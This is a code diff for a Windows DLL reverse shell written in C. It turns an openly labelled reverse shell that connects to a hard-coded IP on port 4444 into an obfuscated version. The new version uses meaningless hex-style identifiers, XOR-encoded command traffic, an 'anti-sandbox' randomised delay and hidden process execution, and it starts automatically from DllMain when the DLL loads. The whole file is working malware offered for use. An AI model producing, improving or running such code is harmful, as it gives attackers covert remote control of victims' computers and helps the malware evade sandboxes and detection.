@@ -1,99 +1,115 @@
-// revshell.c
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
-#include <string.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
-// Hex encode function
-void hex_encode(const char* input, char* output) {
-    const char hex[] = "0123456789abcdef";
-    while (*input) {
-        *output++ = hex[(*input >> 4) & 0xF];
-        *output++ = hex[*input & 0xF];
-        input++;
+#define _0xA1 0x3A
+#define _0xB1 "172.17.0.1"
+#define _0xB2 4444
+
+void _0xC1(char* _0xD1) {
+    while (*_0xD1) {
+        *_0xD1 ^= _0xA1;
+        _0xD1++;
     }
-    *output = '\0';
 }
 
-// Hex decode function
-void hex_decode(const char* input, char* output) {
-    while (*input && input[1]) {
-        char high = (*input >= 'a') ? (*input - 'a' + 10) : (*input >= 'A') ? (*input - 'A' + 10) : (*input - '0');
-        char low  = (input[1] >= 'a') ? (input[1] - 'a' + 10) : (input[1] >= 'A') ? (input[1] - 'A' + 10) : (input[1] - '0');
-        *output++ = (high << 4) | low;
-        input += 2;
+void _0xC2(const char* _0xD2, char* _0xD3) {
+    char _0xD4[3] = { 0 };
+    while (*_0xD2 && *(_0xD2 + 1)) {
+        _0xD4[0] = *_0xD2;
+        _0xD4[1] = *(_0xD2 + 1);
+        *_0xD3++ = (char)strtol(_0xD4, NULL, 16);
+        _0xD2 += 2;
     }
-    *output = '\0';
+    *_0xD3 = '\0';
 }
 
-// Reverse shell thread
-DWORD WINAPI ReverseShell(LPVOID lpParam) {
-    WSADATA wsaData;
-    SOCKET sock;
-    struct sockaddr_in server;
-    char recvbuf[2048];
-    char decoded[1024];
-    char encoded[4096];
-
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-        return 1;
-
-    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    if (sock == INVALID_SOCKET)
-        return 1;
-
-    server.sin_family = AF_INET;
-    server.sin_port = htons(4444);
-    server.sin_addr.s_addr = inet_addr("35.207.239.248");  // 🔁 CHANGE THIS TO YOUR IP
-
-    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
-        closesocket(sock);
-        WSACleanup();
-        return 1;
+void _0xC3(const char* _0xD5, char* _0xD6) {
+    while (*_0xD5) {
+        sprintf(_0xD6, "%02x", (unsigned char)*_0xD5);
+        _0xD5++;
+        _0xD6 += 2;
     }
+    *_0xD6 = '\0';
+}
+
+DWORD WINAPI _0xC4(LPVOID _0xD7) {
+    Sleep(3000 + (rand() % 2000));  // Anti-sandbox randomized delay
+
+    WSADATA _0xE1;
+    SOCKET _0xE2;
+    struct sockaddr_in _0xE3;
+    char _0xE4[4096], _0xE5[2048], _0xE6[4096], _0xE7[8192];
+
+    WSAStartup(MAKEWORD(2, 2), &_0xE1);
+    _0xE2 = socket(AF_INET, SOCK_STREAM, 0);
+
+    _0xE3.sin_family = AF_INET;
+    _0xE3.sin_port = htons(_0xB2);
+    _0xE3.sin_addr.s_addr = inet_addr(_0xB1);
+
+    if (connect(_0xE2, (struct sockaddr*)&_0xE3, sizeof(_0xE3)) != 0) return 1;
 
     while (1) {
-        ZeroMemory(recvbuf, sizeof(recvbuf));
-        int bytes = recv(sock, recvbuf, sizeof(recvbuf) - 1, 0);
-        if (bytes <= 0)
-            break;
+        memset(_0xE4, 0, sizeof(_0xE4));
+        memset(_0xE5, 0, sizeof(_0xE5));
+        memset(_0xE6, 0, sizeof(_0xE6));
+        memset(_0xE7, 0, sizeof(_0xE7));
 
-        recvbuf[bytes] = '\0';
+        if (recv(_0xE2, _0xE4, sizeof(_0xE4), 0) <= 0) break;
 
-        ZeroMemory(decoded, sizeof(decoded));
-        hex_decode(recvbuf, decoded);
+        _0xC2(_0xE4, _0xE5);
+        _0xC1(_0xE5);
 
-        if (strcmp(decoded, "exit") == 0)
-            break;
+        if (strcmp(_0xE5, "exit") == 0) break;
 
-        FILE* pipe = _popen(decoded, "r");
-        if (!pipe) {
-            const char* err = "Command execution failed.\n";
-            hex_encode(err, encoded);
-            send(sock, encoded, strlen(encoded), 0);
-            continue;
+        // Use CreateProcess + ReadFile instead of _popen
+        SECURITY_ATTRIBUTES _0xPA;
+        STARTUPINFOA _0xSI;
+        PROCESS_INFORMATION _0xPI;
+        HANDLE _0xRO, _0xWO;
+        DWORD _0xRDB = 0;
+
+        ZeroMemory(&_0xPA, sizeof(_0xPA));
+        ZeroMemory(&_0xSI, sizeof(_0xSI));
+        ZeroMemory(&_0xPI, sizeof(_0xPI));
+        _0xPA.nLength = sizeof(_0xPA);
+        _0xPA.bInheritHandle = TRUE;
+
+        CreatePipe(&_0xRO, &_0xWO, &_0xPA, 0);
+        SetHandleInformation(_0xRO, HANDLE_FLAG_INHERIT, 0);
+
+        _0xSI.cb = sizeof(_0xSI);
+        _0xSI.dwFlags |= STARTF_USESTDHANDLES;
+        _0xSI.hStdOutput = _0xWO;
+        _0xSI.hStdError = _0xWO;
+
+        if (CreateProcessA(NULL, _0xE5, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &_0xSI, &_0xPI)) {
+            CloseHandle(_0xWO);
+            ReadFile(_0xRO, _0xE6, sizeof(_0xE6) - 1, &_0xRDB, NULL);
+            _0xE6[_0xRDB] = '\0';
+            CloseHandle(_0xRO);
+            CloseHandle(_0xPI.hProcess);
+            CloseHandle(_0xPI.hThread);
         }
 
-        char buffer[1024];
-        while (fgets(buffer, sizeof(buffer), pipe)) {
-            ZeroMemory(encoded, sizeof(encoded));
-            hex_encode(buffer, encoded);
-            send(sock, encoded, strlen(encoded), 0);
-        }
-
-        _pclose(pipe);
+        _0xC1(_0xE6);
+        _0xC3(_0xE6, _0xE7);
+        send(_0xE2, _0xE7, strlen(_0xE7), 0);
     }
 
-    closesocket(sock);
+    closesocket(_0xE2);
     WSACleanup();
     return 0;
 }
 
-// Exported silent entry point for rundll32
-__declspec(dllexport) void CALLBACK StartShell(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    HWND console = GetConsoleWindow();
-    if (console) ShowWindow(console, SW_HIDE);  // Hide any attached window
-    CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
+BOOL WINAPI DllMain(HINSTANCE _0xF1, DWORD _0xF2, LPVOID _0xF3) {
+    if (_0xF2 == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(_0xF1);
+        HANDLE _0xF4 = CreateThread(NULL, 0, _0xC4, NULL, 0, NULL);
+        if (_0xF4) CloseHandle(_0xF4);
+    }
+    return TRUE;
 }
